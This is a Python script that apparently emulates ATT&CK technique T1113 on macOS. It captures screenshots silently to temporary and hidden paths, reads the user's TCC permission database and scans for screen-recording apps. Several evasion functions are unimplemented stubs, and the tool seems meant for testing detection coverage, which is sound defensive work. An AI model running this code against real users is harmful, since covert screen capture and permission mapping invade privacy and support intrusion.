#!/usr/bin/env python3

"""
1113_screen_capture - T1113
Capture screenshots of the desktop for reconnaissance and data collection

Author: @darmado | https://x.com/darmad0
Version: 1.0.0
Generated from YAML procedure definition
"""

import subprocess
import sys
import os
import argparse
from pathlib import Path
import sqlite3
import time
import secrets

# Global variables
SCREENSHOT_PATH = "/tmp/ss.jpg"
HIDDEN_DIR = os.path.expandvars("$HOME/.Trash/.ss")
CACHE_DIR = os.path.expandvars("$HOME/Library/Caches/com.apple.screencapture")

def capture_screenshot():
    """Capture a silent screenshot"""
    
    screenshot_path = "/tmp/ss.jpg"
    print("SCREENSHOT|capturing|Silent screenshot")
    
    try:
        result = subprocess.run(["/usr/sbin/screencapture", "-x", screenshot_path], 
                              capture_output=True, text=True)
        if result.returncode == 0 and os.path.exists(screenshot_path):
            size = os.path.getsize(screenshot_path)
            print(f"SCREENSHOT|captured|{screenshot_path} ({size} bytes)")
        else:
            print("SCREENSHOT|failed|Could not capture screenshot")
            return False
    except Exception as e:
        print(f"SCREENSHOT|failed|{e}")
        return False
    return True

def capture_screenshot_with_info():
    """Capture screenshot and display info"""
    
    screenshot_path = "/tmp/ss.jpg"
    print("SCREENSHOT|capturing|Silent screenshot")
    
    try:
        result = subprocess.run(["/usr/sbin/screencapture", "-x", screenshot_path], 
                              capture_output=True, text=True)
        if result.returncode == 0 and os.path.exists(screenshot_path):
            size = os.path.getsize(screenshot_path)
            print(f"SCREENSHOT|captured|{screenshot_path} ({size} bytes)")
        else:
            print("SCREENSHOT|failed|Could not capture screenshot")
            return False
    except Exception as e:
        print(f"SCREENSHOT|failed|{e}")
        return False
    return True

def capture_hidden_screenshot():
    """Capture screenshot with hidden storage in .Trash"""
    print("Function capture_hidden_screenshot not yet implemented in Python converter")
    pass

def capture_masquerade_screenshot():
    """Capture screenshot using process name masquerading"""
    print("Function capture_masquerade_screenshot not yet implemented in Python converter")
    pass

def capture_cache_screenshot():
    """Capture screenshot stored in realistic cache directory"""
    print("Function capture_cache_screenshot not yet implemented in Python converter")
    pass

def capture_osascript_screenshot():
    """Capture screenshot using osascript/AppleScript interpreter"""
    print("Function capture_osascript_screenshot not yet implemented in Python converter")
    pass

def capture_swift_screenshot():
    """Capture screenshot using Swift system commands"""
    print("Function capture_swift_screenshot not yet implemented in Python converter")
    pass

def capture_python_screenshot():
    """Capture screenshot using Python system commands"""
    
    output_path = f"{os.path.expandvars('$HOME')}/.local/share/python_{secrets.token_hex(4)}.jpg"
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    
    print("PYTHON_SCREENSHOT|capturing|Using Python subprocess (standard library)")
    
    try:
        result = subprocess.run(["/usr/sbin/screencapture", "-x", output_path], 
                              capture_output=True, text=True, timeout=10)
        if result.returncode == 0 and os.path.exists(output_path):
            size = os.path.getsize(output_path)
            print(f"PYTHON_SCREENSHOT|captured|SUCCESS: {output_path} ({size} bytes)")
        else:
            print("PYTHON_SCREENSHOT|failed|capture failed")
            return False
    except Exception as e:
        print(f"PYTHON_SCREENSHOT|failed|{e}")
        return False
    return True

def query_tcc_permissions():
    """Query TCC database for screen recording permissions"""
    
    print("TCC_QUERY|checking|Screen recording permissions in TCC database")
    
    user_tcc = os.path.expandvars("$HOME/Library/Application Support/com.apple.TCC/TCC.db")
    
    try:
        if os.access(user_tcc, os.R_OK):
            print("TCC_QUERY|user_db|Accessible for reading")
            
            conn = sqlite3.connect(user_tcc)
            cursor = conn.cursor()
            
            # Query for screen-related services
            cursor.execute("SELECT DISTINCT service FROM access WHERE service LIKE '%Screen%' OR service LIKE '%kTCC%'")
            services = cursor.fetchall()
            
            if services:
                for service in services:
                    print(f"TCC_QUERY|services|{service[0]}")
                
                # Get specific permissions
                cursor.execute("SELECT service, client, auth_value FROM access WHERE service LIKE '%Screen%'")
                permissions = cursor.fetchall()
                
                for service, client, auth_value in permissions:
                    print(f"TCC_QUERY|permission|{service}: {client} (auth_value: {auth_value})")
            else:
                print("TCC_QUERY|services|No screen-related services found")
            
            conn.close()
        else:
            print("TCC_QUERY|user_db|Protected (normal behavior)")
    except Exception as e:
        print(f"TCC_QUERY|error|{e}")

def scan_privileged_processes():
    """Scan for processes that might have screen recording permissions"""
    
    print("PROCESS_SCAN|scanning|Processes that might have screen recording permissions")
    
    # Look for ScreenTime processes
    try:
        result = subprocess.run(["pgrep", "-f", "ScreenTime"], capture_output=True, text=True)
        if result.stdout.strip():
            pids = result.stdout.strip().split('\n')
            print(f"PROCESS_SCAN|found|ScreenTime processes: {' '.join(pids)}")
    except:
        pass
    
    # Look for recording apps
    recording_apps = ["QuickTime", "Screenshot", "OBS", "Zoom", "Teams", "Skype", "Discord"]
    try:
        result = subprocess.run(["ps", "aux"], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            for app in recording_apps:
                if app.lower() in line.lower() and 'grep' not in line:
                    parts = line.split()
                    if len(parts) >= 11:
                        pid = parts[1]
                        app_name = os.path.basename(parts[10])
                        print(f"PROCESS_SCAN|potential|{app_name} (PID: {pid})")
    except:
        pass
    
    # Check loginwindow
    try:
        result = subprocess.run(["pgrep", "loginwindow"], capture_output=True, text=True)
        if result.stdout.strip():
            pid = result.stdout.strip()
            print(f"PROCESS_SCAN|system|loginwindow (PID: {pid}) - system process with elevated permissions")
    except:
        pass

def capture_tcc_proxy_screenshot():
    """Find and use apps with existing screen recording permissions"""
    print("Function capture_tcc_proxy_screenshot not yet implemented in Python converter")
    pass

def list_available_windows():
    """List available windows for targeted screenshot capture"""
    print("Function list_available_windows not yet implemented in Python converter")
    pass

def capture_window_screenshot():
    """Capture screenshot of specific window by ID"""
    print("Function capture_window_screenshot not yet implemented in Python converter")
    pass

def capture_browser_windows():
    """Capture screenshots of all browser windows"""
    print("Function capture_browser_windows not yet implemented in Python converter")
    pass

def capture_app_windows():
    """Capture screenshots of all application windows"""
    print("Function capture_app_windows not yet implemented in Python converter")
    pass


def main():
    """Main function with argument parsing"""
    parser = argparse.ArgumentParser(description="Capture screenshots of the desktop for reconnaissance and data collection")
    
    parser.add_argument("-s", "--screenshot", action="store_true", help="Capture a silent screenshot")
    parser.add_argument("-d", "--display", action="store_true", help="Capture screenshot and display info")
    parser.add_argument("--list-windows", action="store_true", help="List available windows for targeted screenshot capture")
    parser.add_argument("--window-id", action="store_true", help="Capture screenshot of specific window by ID")
    parser.add_argument("--browser-windows", action="store_true", help="Capture screenshots of all browser windows")
    parser.add_argument("--app-windows", action="store_true", help="Capture screenshots of all application windows")
    parser.add_argument("--hidden", action="store_true", help="Capture screenshot with hidden storage in .Trash")
    parser.add_argument("--masquerade", action="store_true", help="Capture screenshot using process name masquerading")
    parser.add_argument("--cache", action="store_true", help="Capture screenshot stored in realistic cache directory")
    parser.add_argument("--osascript", action="store_true", help="Capture screenshot using osascript/AppleScript interpreter")
    parser.add_argument("--swift", action="store_true", help="Capture screenshot using Swift system commands")
    parser.add_argument("--python", action="store_true", help="Capture screenshot using Python system commands")
    parser.add_argument("--tcc-query", action="store_true", help="Query TCC database for screen recording permissions")
    parser.add_argument("--process-scan", action="store_true", help="Scan for processes that might have screen recording permissions")
    parser.add_argument("--tcc-proxy", action="store_true", help="Find and use apps with existing screen recording permissions")
    parser.add_argument("-a", "--all-methods", action="store_true", help="Test ALL screenshot capture methods for maximum detection coverage")

    args = parser.parse_args()
    
    # Execute based on arguments
    if args.screenshot:
        capture_screenshot()
        return

    if args.display:
        capture_screenshot_with_info()
        return

    if args.list_windows:
        list_available_windows()
        return

    if args.window_id:
        capture_window_screenshot()
        return

    if args.browser_windows:
        capture_browser_windows()
        return

    if args.app_windows:
        capture_app_windows()
        return

    if args.hidden:
        capture_hidden_screenshot()
        return

    if args.masquerade:
        capture_masquerade_screenshot()
        return

    if args.cache:
        capture_cache_screenshot()
        return

    if args.osascript:
        capture_osascript_screenshot()
        return

    if args.swift:
        capture_swift_screenshot()
        return

    if args.python:
        capture_python_screenshot()
        return

    if args.tcc_query:
        query_tcc_permissions()
        return

    if args.process_scan:
        scan_privileged_processes()
        return

    if args.tcc_proxy:
        capture_tcc_proxy_screenshot()
        return

    if args.all_methods:
        capture_screenshot()
        capture_hidden_screenshot()
        capture_masquerade_screenshot()
        capture_cache_screenshot()
        capture_osascript_screenshot()
        capture_swift_screenshot()
        capture_python_screenshot()
        query_tcc_permissions()
        scan_privileged_processes()
        capture_tcc_proxy_screenshot()
        return

    
    # If no arguments, show help
    parser.print_help()

if __name__ == "__main__":
    main()
